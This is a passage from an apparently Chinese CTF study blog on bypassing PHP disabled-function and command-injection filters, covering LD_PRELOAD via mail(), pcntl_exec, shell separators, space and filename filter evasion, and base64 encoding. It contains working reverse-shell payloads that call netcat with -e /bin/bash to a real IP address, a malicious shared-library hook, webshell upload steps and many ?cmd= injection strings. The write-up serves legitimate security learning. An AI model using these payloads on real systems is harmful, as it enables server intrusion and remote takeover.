<p><code>env_vars</code>是一个字符串数组，这些字符串以 环境添加到程序中。数组的格式为 name &#x3D;&gt; value， 键是环境变量的名称，值是 该变量的值。</p>
</li>
</ul>
<p>返回值</p>
<p>返回 <strong><code>false</code></strong>。</p>
<h2 id="0x02替换绕过函数过滤-过"><a href="#0x02替换绕过函数过滤-过" class="headerlink" title="0x02替换绕过函数过滤(过)"></a>0x02替换绕过函数过滤(过)</h2><h2 id="0x03LD-PRELOAD绕过"><a href="#0x03LD-PRELOAD绕过" class="headerlink" title="0x03LD_PRELOAD绕过"></a>0x03LD_PRELOAD绕过</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/Screenshot_20250429_153909.jpg" alt="Screenshot_20250429_153909"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/Screenshot_20250429_153927.jpg" alt="Screenshot_20250429_153927"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/Screenshot_20250429_153954.jpg" alt="Screenshot_20250429_153954"></p>
<h2 id="0x04mail-函数命令"><a href="#0x04mail-函数命令" class="headerlink" title="0x04mail()函数命令"></a>0x04mail()函数命令</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/Screenshot_20250429_154005.jpg" alt="Screenshot_20250429_154005"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/Screenshot_20250429_154053.jpg" alt="Screenshot_20250429_154053"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/Screenshot_20250429_154119.jpg" alt="Screenshot_20250429_154119"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/Screenshot_20250429_154211.jpg" alt="Screenshot_20250429_154211"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/Screenshot_20250429_154303.jpg" alt="Screenshot_20250429_154303"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/Screenshot_20250429_154344.jpg" alt="Screenshot_20250429_154344"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/Screenshot_20250429_154433.jpg" alt="Screenshot_20250429_154433"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/Screenshot_20250429_154513.jpg" alt="Screenshot_20250429_154513"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/Screenshot_20250429_154610.jpg" alt="Screenshot_20250429_154610"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250429194350746.png" alt="image-20250429194350746"></p>
<p>这个题就是</p>
<p>写一个demo.c文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">void payload()&#123;</span><br><span class="line">  system(&quot;nc 121.40.70.148 -e /bin/bash&quot;);</span><br><span class="line">&#125;</span><br><span class="line">int geteuid()</span><br><span class="line">&#123;</span><br><span class="line">  unsetenv(&quot;LD_PRELOAD&quot;);</span><br><span class="line">  payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>demo.php文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">putenv(&quot;LD_PRELOAD=./demo.so&quot;);</span><br><span class="line">mail(&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;,&#x27;&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>用kali生成demo.so文件</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250429194659782.png" alt="image-20250429194659782"></p>
<p>将demo.php和demo.so文件一起通过蚁剑上传</p>
<p>这里是留着后门的</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250429194921050.png" alt="image-20250429194921050"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250429195013370.png" alt="image-20250429195013370"></p>
<p>上传成功   开启服务器监听   然后去访问demo.php网页</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250429195842719.png" alt="image-20250429195842719"></p>
<p>监听成功</p>
<p>下面这是给的第二种方法</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/Screenshot_20250429_154813.jpg" alt="Screenshot_20250429_154813"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/Screenshot_20250429_154833.jpg" alt="Screenshot_20250429_154833"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/Screenshot_20250429_154904.jpg" alt="Screenshot_20250429_154904"></p>
<h2 id="0x05蚁剑及pcntl绕过函数过滤"><a href="#0x05蚁剑及pcntl绕过函数过滤" class="headerlink" title="0x05蚁剑及pcntl绕过函数过滤"></a>0x05蚁剑及pcntl绕过函数过滤</h2><p>这里还是上面那个题    通过蚁剑插件来解题    或者  pcntl函数</p>
<h3 id="antsword"><a href="#antsword" class="headerlink" title="antsword"></a>antsword</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/Screenshot_20250429_200502.jpg" alt="Screenshot_20250429_200502"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/Screenshot_20250429_200607.jpg" alt="Screenshot_20250429_200607"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/Screenshot_20250429_200618.jpg" alt="Screenshot_20250429_200618"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/Screenshot_20250429_201130.jpg" alt="Screenshot_20250429_201130"></p>
<h3 id="pcntl-exec"><a href="#pcntl-exec" class="headerlink" title="pcntl_exec"></a>pcntl_exec</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/Screenshot_20250429_201350.jpg" alt="Screenshot_20250429_201350"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/Screenshot_20250429_201529.jpg" alt="Screenshot_20250429_201529"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/Screenshot_20250429_201559.jpg" alt="Screenshot_20250429_201559"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=pcntl_exec(&quot;/bin/bash&quot;,array(&quot;-c&quot;,&quot;nc 121.40.70.148 2333 -e /bin/bash&quot;));</span><br></pre></td></tr></table></figure>

<p>反弹成功</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250429203823103.png" alt="image-20250429203823103"></p>
<h2 id="0x06操作系统链接符"><a href="#0x06操作系统链接符" class="headerlink" title="0x06操作系统链接符"></a>0x06操作系统链接符</h2><h3 id=""><a href="#" class="headerlink" title=";"></a>;</h3><p>使多个命令按顺序执行</p>
<p>前面的命令和后面的命令都会执行</p>
<h3 id="URL编码-26"><a href="#URL编码-26" class="headerlink" title="&amp;   URL编码  %26"></a>&amp;   URL编码  %26</h3><p>使命令在后台运行 </p>
<p>这样就可以同时执行多条命令</p>
<p>第一条命令无法执行成功  则后面的命令也无法执行</p>
<p>执行的时候要进行一下url编码  不然后面的命令无法执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=%26id</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250421223103445.png" alt="image-20250421223103445"></p>
<h3 id="-1"><a href="#-1" class="headerlink" title="|"></a>|</h3><p>将前面的命令的输出作为后面命令的输入，把前面命令的结果当成后面命令的参数；</p>
<p>前面的命令和后面的命令都会执行，但只显示后面的命令执行结果</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250421223316794.png" alt="image-20250421223316794"></p>
<h3 id="-2"><a href="#-2" class="headerlink" title="||"></a>||</h3><p>类似于程序中的if-else语句。</p>
<p>若前面的命令执行成功，则后面的命令就不会执行；</p>
<p>若前面的命令执行失败，则执行后面的命令。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250421223621079.png" alt="image-20250421223621079"></p>
<h2 id="0x07-空格过滤绕过"><a href="#0x07-空格过滤绕过" class="headerlink" title="0x07.空格过滤绕过"></a>0x07.空格过滤绕过</h2><h3 id="1-大括号-cat-flag-txt"><a href="#1-大括号-cat-flag-txt" class="headerlink" title="1.大括号{cat,flag.txt};"></a>1.大括号{cat,flag.txt};</h3><h3 id="2-IFS代替空格；-IFS、-IFS-、-IFS-9"><a href="#2-IFS代替空格；-IFS、-IFS-、-IFS-9" class="headerlink" title="2.$IFS代替空格；$IFS、${IFS}、$IFS$9"></a>2.$IFS代替空格；$IFS、${IFS}、$IFS$9</h3><p>Linux下有一个特殊的环境变量叫做IFS , 叫做内部字段分隔符（internal field separator）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=ls$IFS-l</span><br></pre></td></tr></table></figure>

<p>单纯$IFS2,IFS2被bash解释器当做变量名，输不出来结果，加一个{}就固定了变量名。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=ls$&#123;IFS&#125;-l</span><br></pre></td></tr></table></figure>

<p>$IFS$9-后面加个$与{}类似，起截断作用，$9是当前系统shell进程第九个参数持有者，始终为空字符串</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=ls$IFS$9-l</span><br></pre></td></tr></table></figure>

<h3 id="3-重定向字符"><a href="#3-重定向字符" class="headerlink" title="3.重定向字符 &lt;, &lt;&gt;;"></a>3.重定向字符 &lt;, &lt;&gt;;</h3><p>“&lt;”表示的是输入重定向的意思，就是把&lt;后面跟的文件取代键盘作为新的输入设备。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?cmd=cat&lt;flag.php</span><br><span class="line"></span><br><span class="line">?cmd=cat&lt;&gt;flag.php</span><br></pre></td></tr></table></figure>

<h3 id="4-09-Tab-20-space"><a href="#4-09-Tab-20-space" class="headerlink" title="4.%09(Tab),%20(space);"></a>4.%09(Tab),%20(space);</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?cmd=cat%09flag.php</span><br><span class="line"></span><br><span class="line">?cmd=cat%20flag.php</span><br></pre></td></tr></table></figure>

<h2 id="0x08-文件名过滤绕过"><a href="#0x08-文件名过滤绕过" class="headerlink" title="0x08.文件名过滤绕过"></a>0x08.文件名过滤绕过</h2><h3 id="1-通配符-绕过"><a href="#1-通配符-绕过" class="headerlink" title="1.通配符  ?  * 绕过"></a>1.通配符  ?  * 绕过</h3><p>通配符是一种特殊语句，主要有  ?   和   *   ,用来模糊搜索文件。</p>
<p>? 在linux里面可以进行代替字母。? 仅代表单个字符串，但此单子必须存在。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat fl?g.tx?</span><br></pre></td></tr></table></figure>

<p>* 在linux里面可以进行模糊匹配。 * 可以代表任何字符串。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat  f*</span><br></pre></td></tr></table></figure>

<p>多个匹配结果同时展示</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?cmd=passthru(&#x27;cat fl?g.p?p&#x27;);</span><br><span class="line"></span><br><span class="line">?cmd=passthru(&#x27;cat fl*&#x27;);</span><br></pre></td></tr></table></figure>

<h3 id="2-单引号、双引号绕过"><a href="#2-单引号、双引号绕过" class="headerlink" title="2.单引号、双引号绕过"></a>2.单引号、双引号绕过</h3><p> ‘’、””  代表空字符    即单引号与双引号会被解析为空字符</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?cmd=passthru(&#x27;cat f&quot;&quot;ag.ph&quot;&quot;p&#x27;);    会被解析为   passthru(&#x27;cat flag.php&#x27;)  但可以绕过flag与php的过滤并执行命令</span><br><span class="line"></span><br><span class="line">echo fl&quot;ag.ph&quot;&quot;p   --&gt;flag.php</span><br></pre></td></tr></table></figure>

<h3 id="3-反斜杠-绕过"><a href="#3-反斜杠-绕过" class="headerlink" title="3.反斜杠  \   绕过"></a>3.反斜杠  \   绕过</h3><p>把特殊字符去掉功能性，单纯表示为字符串。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo benben &gt; dazhuang   会把benben  存入到dazhuang文件里</span><br><span class="line"></span><br><span class="line">echo benben \&gt; dazhuang  则会把  benben &gt; dazhuang 直接输出出来</span><br><span class="line"></span><br><span class="line">所以有  cat f\ag.p\hp   反斜杠  \   绕过</span><br></pre></td></tr></table></figure>

<h3 id="4-特殊变量-1到-9、-和-等"><a href="#4-特殊变量-1到-9、-和-等" class="headerlink" title="4.特殊变量:  $1到$9、$@和$*等"></a>4.特殊变量:  $1到$9、$@和$*等</h3><p>输出为空  空字符</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat  fl$1ag.t$9xt  -&gt;  cat flag.txt</span><br><span class="line"></span><br><span class="line">cat fl$*\ag.txt -&gt; cat flag.txt</span><br></pre></td></tr></table></figure>

<h3 id="5-内联执行"><a href="#5-内联执行" class="headerlink" title="5.内联执行"></a>5.内联执行</h3><p>自定义字符串，再拼接起来</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=f;d=l;c=ag;d=ph;e=p;cat $a$b$c$d$e     就表示  cat flag.txt</span><br></pre></td></tr></table></figure>

<h3 id="6-利用linux中的环境变量"><a href="#6-利用linux中的环境变量" class="headerlink" title="6.利用linux中的环境变量"></a>6.利用linux中的环境变量</h3><p>使用环境变量里的字符执行命令。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo $PATH    PATH默认系统环境变量</span><br><span class="line"></span><br><span class="line">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games</span><br><span class="line"></span><br><span class="line">echo f$&#123;PATH:5:1&#125;$&#123;PATH:8:1&#125;g     $&#123;PATH:5:1&#125;就是从第五个字符开始  往后取一个字符即l  这里要从0开始数</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250421150744766.png" alt="image-20250421150744766"></p>
<h3 id="0x09-常见文件读取目录绕过"><a href="#0x09-常见文件读取目录绕过" class="headerlink" title="0x09.常见文件读取目录绕过"></a>0x09.常见文件读取目录绕过</h3><h3 id="1-tac：反向显示"><a href="#1-tac：反向显示" class="headerlink" title="1.tac：反向显示"></a>1.tac：反向显示</h3><p>与cat功能类似，但是是反向显示，从最后一行往前开始显示。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250421151304944.png" alt="image-20250421151304944"></p>
<h3 id="2-more-一页一页的显示档案内容"><a href="#2-more-一页一页的显示档案内容" class="headerlink" title="2.more:一页一页的显示档案内容"></a>2.more:一页一页的显示档案内容</h3><h3 id="3-less：与more类似"><a href="#3-less：与more类似" class="headerlink" title="3.less：与more类似"></a>3.less：与more类似</h3><h3 id="4-tail：查看末尾几行；"><a href="#4-tail：查看末尾几行；" class="headerlink" title="4.tail：查看末尾几行；"></a>4.tail：查看末尾几行；</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=passthru(&quot;tail fl\ag.ph\p&quot;);</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250421151749762.png" alt="image-20250421151749762"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250421151811509.png" alt="image-20250421151811509"></p>
<p>可以看到他是从  3   开始的显示了10行  即末尾10行</p>
<h3 id="5-nl：显示的时候，顺便输出行号"><a href="#5-nl：显示的时候，顺便输出行号" class="headerlink" title="5.nl：显示的时候，顺便输出行号"></a>5.nl：显示的时候，顺便输出行号</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250421151932757.png" alt="image-20250421151932757"></p>
<h3 id="6-od：以二进制的方式读取档案内容；"><a href="#6-od：以二进制的方式读取档案内容；" class="headerlink" title="6.od：以二进制的方式读取档案内容；"></a>6.od：以二进制的方式读取档案内容；</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=passthru(&quot;od -A d -c fla\g.ph\p&quot;);   这是以8进制的格式输出的</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250421152138076.png" alt="image-20250421152138076"></p>
<p>-A d -c 会把8进制 转换为 ASCII吗字符</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250421152454110.png" alt="image-20250421152454110"></p>
<h3 id="7-xxd：读取二进制文件"><a href="#7-xxd：读取二进制文件" class="headerlink" title="7.xxd：读取二进制文件"></a>7.xxd：读取二进制文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxd flag.php  ?cmd=passthru(&quot;xxd flag.php&quot;);</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250421152620707.png" alt="image-20250421152620707"></p>
<h3 id="8-sort：主要用于排序文件；"><a href="#8-sort：主要用于排序文件；" class="headerlink" title="8.sort：主要用于排序文件；"></a>8.sort：主要用于排序文件；</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sort flag.php   ?cmd=passthru(&quot;sort flag.php&quot;);</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250421152717253.png" alt="image-20250421152717253"></p>
<p>可以发现他把 10  和  11排前面去了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sort在  /usr/bin/sort  里   有时会通过?cmd=passthru(&quot;/usr/bin/sort flag.php&quot;)执行</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250421152853353.png" alt="image-20250421152853353"></p>
<h3 id="9-uniq：报告或删除文件中重复的行；"><a href="#9-uniq：报告或删除文件中重复的行；" class="headerlink" title="9.uniq：报告或删除文件中重复的行；"></a>9.uniq：报告或删除文件中重复的行；</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uniq flag.php    ?cmd=passthru(&quot;uniq flag.php&quot;);</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250421153101866.png" alt="image-20250421153101866"></p>
<p>可以看到uniq只输出了一次flag</p>
<h3 id="10-file-f-报错出具体内容"><a href="#10-file-f-报错出具体内容" class="headerlink" title="10.file -f; 报错出具体内容"></a>10.file -f; 报错出具体内容</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file -f flag.php   ?cmd=passthru(&quot;file -f flag.php&quot;);</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250421153306972.png" alt="image-20250421153306972"></p>
<p>可以看到一些   No such file or directory   的报错  把内容给显示出来了</p>
<p>11.grep：在文本中查找指定字符串；</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep flag flag.php     ?cmd=passthru(&quot;grep flag flag.php&quot;);</span><br></pre></td></tr></table></figure>

<p>从flag.php文本文件中搜索包含  flag  字符串的行  并显示</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250421153728835.png" alt="image-20250421153728835"></p>
<h2 id="0x10-编码绕过"><a href="#0x10-编码绕过" class="headerlink" title="0x10.编码绕过"></a>0x10.编码绕过</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/csd0617/piclist@main/img/20250810095735537.jpg" alt="qq_pic_merged_1745221195907"></p>
<h3 id="1-base64编码"><a href="#1-base64编码" class="headerlink" title="1.base64编码"></a>1.base64编码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat flag.php-&gt;Y2F0IGZsYWcucGhw   (base64编码)</span><br><span class="line"></span><br><span class="line">echo Y2F0IGZsYWcucGhw | base64 -d     ?cmd=passthru(&#x27;`echo &quot;Y2F0IGZsYWcucGhw&quot;|base64 -d`&#x27;);</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250421154156960.png" alt="image-20250421154156960"></p>
<p>| 把前面指令执行的结果，变成后面指令的参数</p>
